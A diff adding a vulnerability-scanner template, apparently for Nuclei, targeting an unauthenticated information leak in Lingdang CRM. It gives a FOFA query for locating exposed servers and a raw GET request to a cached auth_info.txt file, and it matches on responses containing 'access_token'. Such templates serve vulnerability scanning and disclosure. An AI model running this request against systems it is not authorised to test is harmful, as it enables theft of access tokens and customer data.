@@ -1,0 +1,24 @@
+id: lingdang-crm-auth-info-info-leak
+
+info:
+  name: "灵当CRM auth-info 接口未授权导致信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js"
+          灵当CRM（Customer Relationship Management）为中小企业提供客户信息管理、销售流程跟踪及服务支持功能。该系统auth-info接口未正确实施访问控制，导致攻击者可通过特定路径访问获取敏感业务数据。该漏洞允许远程攻击者在未认证状态下读取系统内部信息，可能包含用户凭证、客户资料等关键数据。
+  tags: 灵当CRM
+
+http:
+- raw:
+  - |
+    GET /crm/dataCache/weixin/auth_info.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'access_token'
